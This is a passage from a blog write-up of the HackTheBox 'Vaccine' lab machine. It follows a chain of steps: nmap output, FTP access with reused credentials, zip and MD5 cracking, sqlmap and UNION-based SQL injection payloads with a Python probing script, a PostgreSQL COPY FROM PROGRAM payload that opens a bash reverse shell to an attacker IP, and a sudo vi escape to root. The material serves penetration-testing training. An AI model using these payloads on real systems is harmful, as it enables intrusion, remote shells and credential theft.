+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">      </span><span class="n">httponly</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">set</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">MegaCorp</span><span class="w"> </span><span class="n">Login</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">OSs</span><span class="p">:</span><span class="w"> </span><span class="n">Unix</span><span class="p">,</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Sun</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">04</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 1691.79 seconds
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>The result of both this scan</li>
+<li>open ports
+<ul>
+<li>21 / ftp</li>
+<li>22 / SSH</li>
+<li>80 / http</li>
+</ul>
+</li>
+</ul>
+<h2 id="ftp">FTP</h2>
+<ul>
+<li>
+<p>login with this credentials</p>
+<ul>
+<li><code>ftpuser:mc@F1l3ZilL4</code></li>
+<li>this credentails found from previous machine called <code>oopsie</code></li>
+</ul>
+</li>
+<li>
+<p>Found <code>backup.zip</code> file</p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/1.png" title="ftp as ftpuser" data-thumbnail="/posts/htb/vaccine/1.png" data-sub-html="<h2>ftp as ftpuser</h2><p>ftp as ftpuser</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/1.png"
+            data-srcset="/posts/htb/vaccine/1.png, /posts/htb/vaccine/1.png 1.5x, /posts/htb/vaccine/1.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/1.png" width="704" height="313" />
+    </a><figcaption class="image-caption">ftp as ftpuser</figcaption>
+    </figure></p>
+<ul>
+<li>download the <code>zip file</code></li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/2.png" title="download the zipfile" data-thumbnail="/posts/htb/vaccine/2.png" data-sub-html="<h2>download the zipfile</h2><p>download the zipfile</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/2.png"
+            data-srcset="/posts/htb/vaccine/2.png, /posts/htb/vaccine/2.png 1.5x, /posts/htb/vaccine/2.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/2.png" width="703" height="324" />
+    </a><figcaption class="image-caption">download the zipfile</figcaption>
+    </figure></p>
+<h2 id="zip2john">Zip2John</h2>
+<ul>
+<li>the zip file is encrypted</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/3.png" title="backup.zip password protected" data-thumbnail="/posts/htb/vaccine/3.png" data-sub-html="<h2>backup.zip password protected</h2><p>backup.zip password protected</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/3.png"
+            data-srcset="/posts/htb/vaccine/3.png, /posts/htb/vaccine/3.png 1.5x, /posts/htb/vaccine/3.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/3.png" width="674" height="197" />
+    </a><figcaption class="image-caption">backup.zip password protected</figcaption>
+    </figure></p>
+<ul>
+<li>Time to use <code>zip2john</code></li>
+<li>Direct the output from <code>zip2john</code> into file called <code>backup.hash</code></li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/4.png" title="zip2john" data-thumbnail="/posts/htb/vaccine/4.png" data-sub-html="<h2>zip2john</h2><p>zip2john</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/4.png"
+            data-srcset="/posts/htb/vaccine/4.png, /posts/htb/vaccine/4.png 1.5x, /posts/htb/vaccine/4.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/4.png" width="1177" height="864" />
+    </a><figcaption class="image-caption">zip2john</figcaption>
+    </figure></p>
+<h3 id="john-the-ripperjtr">John-The-Ripper[JtR]</h3>
+<ul>
+<li>Use JtR to crack it
+<ul>
+<li>found the password</li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/5.png" title="cracked the zipfile" data-thumbnail="/posts/htb/vaccine/5.png" data-sub-html="<h2>cracked the zipfile</h2><p>cracked the zipfile</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/5.png"
+            data-srcset="/posts/htb/vaccine/5.png, /posts/htb/vaccine/5.png 1.5x, /posts/htb/vaccine/5.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/5.png" width="933" height="396" />
+    </a><figcaption class="image-caption">cracked the zipfile</figcaption>
+    </figure></p>
+<h3 id="content-of-the-zipfile">Content of the ZipFile</h3>
+<ul>
+<li>
+<p>Unzip and got 2 files called</p>
+<ul>
+<li><code>index.php</code></li>
+<li><code>style.css</code></li>
+</ul>
+</li>
+<li>
+<p>Found the password in <code>index.php</code></p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/6.png" title="found the credentials" data-thumbnail="/posts/htb/vaccine/6.png" data-sub-html="<h2>found the credentials</h2><p>found the credentials</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/6.png"
+            data-srcset="/posts/htb/vaccine/6.png, /posts/htb/vaccine/6.png 1.5x, /posts/htb/vaccine/6.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/6.png" width="1268" height="368" />
+    </a><figcaption class="image-caption">found the credentials</figcaption>
+    </figure></p>
+<ul>
+<li>turns out, it is <code>md5 hash</code></li>
+<li>crack it using online tool
+<ul>
+<li><a href="https://crackstation.net/" target="_blank" rel="noopener noreffer ">crackstation.net</a></li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/7.png" title="crackstation" data-thumbnail="/posts/htb/vaccine/7.png" data-sub-html="<h2>crackstation</h2><p>crackstation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/7.png"
+            data-srcset="/posts/htb/vaccine/7.png, /posts/htb/vaccine/7.png 1.5x, /posts/htb/vaccine/7.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/7.png" width="1058" height="356" />
+    </a><figcaption class="image-caption">crackstation</figcaption>
+    </figure></p>
+<h2 id="the-website">The Website</h2>
+<ul>
+<li>Login with the password found in <code>index.php</code> file</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/8.png" title="MegaCorp Car webpage" data-thumbnail="/posts/htb/vaccine/8.png" data-sub-html="<h2>MegaCorp Car webpage</h2><p>MegaCorp Car webpage</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/8.png"
+            data-srcset="/posts/htb/vaccine/8.png, /posts/htb/vaccine/8.png 1.5x, /posts/htb/vaccine/8.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/8.png" width="1040" height="712" />
+    </a><figcaption class="image-caption">MegaCorp Car webpage</figcaption>
+    </figure></p>
+<ul>
+<li>Assuming this is a database loaded several cars</li>
+<li>Try to insert <code>'</code> in the search field and got this error</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/9.png" title="try to SQL injection" data-thumbnail="/posts/htb/vaccine/9.png" data-sub-html="<h2>try to SQL injection</h2><p>try to SQL injection</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/9.png"
+            data-srcset="/posts/htb/vaccine/9.png, /posts/htb/vaccine/9.png 1.5x, /posts/htb/vaccine/9.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/9.png" width="1012" height="442" />
+    </a><figcaption class="image-caption">try to SQL injection</figcaption>
+    </figure></p>
+<h3 id="sqlmap">SQLmap</h3>
+<ul>
+<li>Here is the syntax. Sqlmap also needed cookie for this to work</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap.py -u <span class="s1">&#39;http://10.10.10.46/dashboard.php?search=sunny&#39;</span> --cookie<span class="o">=</span><span class="s2">&#34;PHPSESSID=q14pc524upvp0hspqoh1n5nq8p&#34;</span> --batch
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/vaccine/10.png" title="PostgreSQL database" data-thumbnail="/posts/htb/vaccine/10.png" data-sub-html="<h2>PostgreSQL database</h2><p>PostgreSQL database</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/10.png"
+            data-srcset="/posts/htb/vaccine/10.png, /posts/htb/vaccine/10.png 1.5x, /posts/htb/vaccine/10.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/10.png" width="1061" height="175" />
+    </a><figcaption class="image-caption">PostgreSQL database</figcaption>
+    </figure></p>
+<ul>
+<li>This server is using PostgreSQL database</li>
+<li>Sqlmap also found vulnerability can lead into injections</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/11.png" title="sqlmap payload" data-thumbnail="/posts/htb/vaccine/11.png" data-sub-html="<h2>sqlmap payload</h2><p>sqlmap payload</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/11.png"
+            data-srcset="/posts/htb/vaccine/11.png, /posts/htb/vaccine/11.png 1.5x, /posts/htb/vaccine/11.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/11.png" width="1269" height="470" />
+    </a><figcaption class="image-caption">sqlmap payload</figcaption>
+    </figure></p>
+<h3 id="union-select">UNION select</h3>
+<ul>
+<li>Source
+<ul>
+<li><a href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank" rel="noopener noreffer ">SQLinjection UNION attacks[PortSwigger]</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-columns-for-attack">Finding Columns for attack</h3>
+<ul>
+<li>Finding how many columns for SQL injection attack</li>
+<li>By inserting this into <code>search field</code>:
+<ul>
+<li><code>' ORDER BY 1--</code></li>
+<li><code>' ORDER BY 2--</code></li>
+<li><code>' ORDER BY 3--</code> .. and so on.
+-  Until you&rsquo;ve found an error.</li>
+</ul>
+</li>
+</ul>
+<h3 id="python-script">Python script</h3>
+<ul>
+<li>However, I&rsquo;m kinda lazy. So, I made python script for it.</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://10.10.10.46/dashboard.php?search=&#39; ORDER BY </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> --&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span><span class="s1">&#39;lfbncgq98bat28uu4v3r4j2dnh&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2449</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error Not Here </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error Here </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/12.png" title="checking columns" data-thumbnail="/posts/htb/vaccine/12.png" data-sub-html="<h2>checking columns</h2><p>checking columns</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/12.png"
+            data-srcset="/posts/htb/vaccine/12.png, /posts/htb/vaccine/12.png 1.5x, /posts/htb/vaccine/12.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/12.png" width="299" height="166" />
+    </a><figcaption class="image-caption">checking columns</figcaption>
+    </figure></p>
+<ul>
+<li>By looking at this result, we&rsquo;ve found 5 columns.</li>
+</ul>
+<h3 id="finding-columns-with-useful-data">Finding Columns with useful data</h3>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.</div>
+        </div>
+    </div>
+<ul>
+<li>
+<p>Now, we just found <code>5 columns</code></p>
+</li>
+<li>
+<p>The next payload gonna be using <code>UNION SELECT</code></p>
+</li>
+<li>
+<p><code>Place string into each column.</code></p>
+</li>
+<li>
+<p>This is what I&rsquo;m gonna try:</p>
+<ul>
+<li><code>' UNION SELECT 'a',NULL,NULL,NULL,NULL--</code></li>
+<li><code>' UNION SELECT NULL,'a',NULL,NULL,NULL--</code></li>
+<li><code>' UNION SELECT NULL,NULL,'a',NULL,NULL--</code></li>
+<li><code>' UNION SELECT NULL,NULL,NULL,'a',NULL--</code></li>
+<li><code>' UNION SELECT NULL,NULL,NULL,NULL,'a'--</code></li>
+</ul>
+</li>
+<li>
+<p>Well, we&rsquo;ve found an error at the first column that state:</p>
+<ul>
+<li><code>ERROR:  invalid input syntax for integer: &quot;a&quot; LINE 1: ...ect \* from cars where name ilike '%' UNION SELECT 'a',NULL,N...</code></li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/13.png" title="SQLi union select" data-thumbnail="/posts/htb/vaccine/13.png" data-sub-html="<h2>SQLi union select</h2><p>SQLi union select</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/13.png"
+            data-srcset="/posts/htb/vaccine/13.png, /posts/htb/vaccine/13.png 1.5x, /posts/htb/vaccine/13.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/13.png" width="1013" height="744" />
+    </a><figcaption class="image-caption">SQLi union select</figcaption>
+    </figure></p>
+<div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">If the data type of a column is not compatible with string data, the injected query will cause a database error, such as: </br>
+<code>Conversion failed when converting the varchar value 'a' to data type int.</code></div>
+        </div>
+    </div>
+<ul>
+<li>The rest of it. Work Fine</li>
+</ul>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<h3 id="the-version-of-database">The Version of database</h3>
+<ul>
+<li>Let&rsquo;s get the database version by inserting this in search field:</li>
+<li><code>' UNION SELECT NULL,VERSION(),NULL,NULL,NULL--</code></li>
+<li>The result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/14.png" title="found injection point" data-thumbnail="/posts/htb/vaccine/14.png" data-sub-html="<h2>found injection point</h2><p>found injection point</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/14.png"
+            data-srcset="/posts/htb/vaccine/14.png, /posts/htb/vaccine/14.png 1.5x, /posts/htb/vaccine/14.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/14.png" width="1035" height="801" />
+    </a><figcaption class="image-caption">found injection point</figcaption>
+    </figure></p>
+<h2 id="exploit">Exploit</h2>
+<ul>
+<li>
+<p>I found this article</p>
+</li>
+<li>
+<p><a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5" target="_blank" rel="noopener noreffer ">Authenticated Arbitrary Command Execution on PostgreSQL 9.3 &gt; Latest</a></p>
+</li>
+<li>
+<p>Let&rsquo;s try exploit it.</p>
+</li>
+<li>
+<p>by inserting this:</p>
+<ul>
+<li><code>';DROP TABLE IF EXISTS cmd_exec;--</code></li>
+<li><code>';CREATE TABLE cmd_exec(cmd_output text);--</code></li>
+<li><code>';COPY cmd_exec FROM PROGRAM 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.86/9901 0&gt;&amp;1&quot;;'--</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<ul>
+<li>Got the reverse shell</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/15.png" title="shell as postgres" data-thumbnail="/posts/htb/vaccine/15.png" data-sub-html="<h2>shell as postgres</h2><p>shell as postgres</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/15.png"
+            data-srcset="/posts/htb/vaccine/15.png, /posts/htb/vaccine/15.png 1.5x, /posts/htb/vaccine/15.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/15.png" width="802" height="398" />
+    </a><figcaption class="image-caption">shell as postgres</figcaption>
+    </figure></p>
+<ul>
+<li>Found ssh key</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/16.png" title="found ssh key" data-thumbnail="/posts/htb/vaccine/16.png" data-sub-html="<h2>found ssh key</h2><p>found ssh key</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/16.png"
+            data-srcset="/posts/htb/vaccine/16.png, /posts/htb/vaccine/16.png 1.5x, /posts/htb/vaccine/16.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/16.png" width="705" height="313" />
+    </a><figcaption class="image-caption">found ssh key</figcaption>
+    </figure></p>
+<h2 id="ssh">SSH</h2>
+<ul>
+<li>Copy the key and change the permission with <code>chmod 600</code></li>
+<li>ssh into it</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/17.png" title="ssh as postgres" data-thumbnail="/posts/htb/vaccine/17.png" data-sub-html="<h2>ssh as postgres</h2><p>ssh as postgres</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/17.png"
+            data-srcset="/posts/htb/vaccine/17.png, /posts/htb/vaccine/17.png 1.5x, /posts/htb/vaccine/17.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/17.png" width="1154" height="630" />
+    </a><figcaption class="image-caption">ssh as postgres</figcaption>
+    </figure></p>
+<ul>
+<li>Let&rsquo;s take a look at the website folder</li>
+<li><code>/var/www/html</code></li>
+<li>we&rsquo;ve found a lot of files</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/18.png" title="list webroot directory" data-thumbnail="/posts/htb/vaccine/18.png" data-sub-html="<h2>list webroot directory</h2><p>list webroot directory</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/18.png"
+            data-srcset="/posts/htb/vaccine/18.png, /posts/htb/vaccine/18.png 1.5x, /posts/htb/vaccine/18.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/18.png" width="620" height="342" />
+    </a><figcaption class="image-caption">list webroot directory</figcaption>
+    </figure></p>
+<ul>
+<li>First, lets check if there any user on it by using <code>grep</code></li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/19.png" title="found credentials" data-thumbnail="/posts/htb/vaccine/19.png" data-sub-html="<h2>found credentials</h2><p>found credentials</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/19.png"
+            data-srcset="/posts/htb/vaccine/19.png, /posts/htb/vaccine/19.png 1.5x, /posts/htb/vaccine/19.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/19.png" width="1265" height="428" />
+    </a><figcaption class="image-caption">found credentials</figcaption>
+    </figure></p>
+<ul>
+<li>
+<p>Found 2 user exist:</p>
+<ul>
+<li><code>admin</code></li>
+<li><code>postgres</code></li>
+</ul>
+</li>
+<li>
+<p>However, postgres user have it&rsquo;s own password.</p>
+</li>
+<li>
+<p>Now, we&rsquo;ve got the password. Let&rsquo;s try check the sudo permission on it by typing <code>sudo -l</code></p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/20.png" title="check sudo permission" data-thumbnail="/posts/htb/vaccine/20.png" data-sub-html="<h2>check sudo permission</h2><p>check sudo permission</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/20.png"
+            data-srcset="/posts/htb/vaccine/20.png, /posts/htb/vaccine/20.png 1.5x, /posts/htb/vaccine/20.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/20.png" width="1241" height="239" />
+    </a><figcaption class="image-caption">check sudo permission</figcaption>
+    </figure></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>Interesting, this user can run <code>vi</code> as sudo on specific file</li>
+<li>Let&rsquo;s execute it by open the file with full path
+<ul>
+<li><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></li>
+<li>now, press <code>esc</code> and type <code>:!/bin/sh</code></li>
+<li>press <code>return</code></li>
+<li>Source
+- <a href="https://gtfobins.github.io/gtfobins/vi/#sudo" target="_blank" rel="noopener noreffer ">sudo vi GTFOBins</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="root">Root</h3>
+<ul>
+<li>Now, I&rsquo;m root</li>
+<li>Found the root flag</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/vaccine/21.png" title="become root" data-thumbnail="/posts/htb/vaccine/21.png" data-sub-html="<h2>become root</h2><p>become root</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/vaccine/21.png"
+            data-srcset="/posts/htb/vaccine/21.png, /posts/htb/vaccine/21.png 1.5x, /posts/htb/vaccine/21.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/vaccine/21.png" width="772" height="378" />
+    </a><figcaption class="image-caption">become root</figcaption>
+    </figure></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I’ve learned a lot today. Make sure to configure the database properly and please update it. Use, long and complicate passwords. DO NOT mix around with the <code>user command</code> and the <code>root command</code>.</p>
+<p>I have a fun time doing this machine and I hope you guys do too. Bye ;)</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 21-07-2021</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/htb/vaccine/" data-title="HackTheBox - Vaccine Writeup" data-via="_shafiqaiman_" data-hashtags="sqlmap,sql-union,sqli,GTFOBins,ftp,rce,zip2john,john,crackstation,python,PostgreSQL"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/htb/vaccine/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/htb/vaccine/" data-title="HackTheBox - Vaccine Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="http://localhost:1313/posts/htb/vaccine/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/sqlmap/">Sqlmap</a>,&nbsp;<a href="/tags/sql-union/">Sql-Union</a>,&nbsp;<a href="/tags/sqli/">Sqli</a>,&nbsp;<a href="/tags/gtfobins/">GTFOBins</a>,&nbsp;<a href="/tags/ftp/">Ftp</a>,&nbsp;<a href="/tags/rce/">Rce</a>,&nbsp;<a href="/tags/zip2john/">Zip2john</a>,&nbsp;<a href="/tags/john/">John</a>,&nbsp;<a href="/tags/crackstation/">Crackstation</a>,&nbsp;<a href="/tags/python/">Python</a>,&nbsp;<a href="/tags/postgresql/">PostgreSQL</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/htb/archetype/" class="prev" rel="prev" title="HacktheBox - Archetype Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HacktheBox - Archetype Writeup</a>
+            <a href="/posts/htb/shield/" class="next" rel="next" title="HackTheBox - Shield Writeup">HackTheBox - Shield Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
